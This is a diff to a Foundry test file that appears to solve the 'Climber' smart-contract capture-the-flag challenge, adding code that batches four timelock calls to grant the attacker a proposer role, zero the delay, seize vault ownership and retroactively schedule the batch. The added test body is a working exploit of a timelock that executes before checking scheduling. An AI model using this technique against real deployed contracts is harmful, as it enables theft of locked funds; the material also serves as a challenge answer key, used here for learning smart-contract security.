@@ -7,6 +7,7 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {ClimberAttacker} from "./ClimberAttacker.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +86,29 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+
+        ClimberAttacker attacker = new ClimberAttacker(address(timelock), address(vault), address(token), recovery);
+
+        uint256 transactionCount = 4;
+        address[] memory targets = new address[](transactionCount);
+        uint256[] memory values = new uint256[](transactionCount);
+        bytes[] memory dataElements = new bytes[](transactionCount);
+        bytes32 salt = bytes32(0);
+
+
+        targets[0] = address (timelock);
+        dataElements[0] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(attacker));
+
+        targets[1] = address (timelock);
+        dataElements[1] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
+
+        targets[2] = address (vault);
+        dataElements[2] = abi.encodeWithSelector(vault.transferOwnership.selector, address(attacker));
+
+        targets[3] = address (attacker);
+        dataElements[3] = abi.encodePacked(attacker.schedule.selector);
+
+        timelock.execute(targets, values, dataElements, salt);
     }
 
     /**
